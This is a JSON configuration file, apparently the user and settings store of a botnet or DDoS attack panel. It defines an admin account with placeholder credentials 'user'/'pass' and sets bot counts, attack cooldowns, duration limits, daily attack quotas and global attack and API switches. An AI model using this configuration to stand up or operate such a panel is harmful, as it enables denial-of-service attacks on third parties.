{
  "users": [
    {
      "username": "user",
      "password": "pass",
      "max_bots": -1,
      "admin": true,
      "cooldown": 0,
      "duration_limit": 0,
      "expiry": 0,
      "banned": false,
      "conns": 3,
      "api": false,
      "daily_attack_count": 8,
      "daily_attack_max": 100,
      "last_reset_time": 1748429833,
      "powersaving_bypass": false
    }
  ],
  "total_attacks": 12,
  "global_max_concurrent_attacks": 4,
  "global_api_enabled": true,
  "global_attacks_enabled": true,
  "logging_enabled": true
}
